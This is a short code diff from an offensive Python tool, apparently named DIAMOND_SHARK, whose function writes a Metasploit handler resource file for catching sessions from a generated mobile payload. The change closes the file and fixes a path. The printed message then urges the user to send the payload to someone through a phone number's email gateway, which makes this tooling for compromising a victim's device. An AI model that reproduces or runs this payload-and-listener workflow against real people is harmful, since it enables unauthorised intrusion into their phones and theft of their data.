@@ -32,7 +32,8 @@ def GENERATE_payload():
     handler.write('\n' + handler_port)
     handler.write('\nset ExitOnSession false')
     handler.write('\nexploit -j -z')
-    print colored('Your handler file is located at root/ArmsCommander/DIAMOND_SHARK/payload/handler_file.rc','red','on_white')
+    handler.close()
+    print colored('Your handler file is located at: /root/ArmsCommander/mobiledevices/DIAMOND_SHARK/payload/handler_file.rc','red','on_white')
     print "To use your handler in Metasploit, start it, and then type 'resource <file>.rc'"
     # Tell them to go send it
     print colored('Go send the payload to someone as a email (the phone number email) (:','red','on_white')
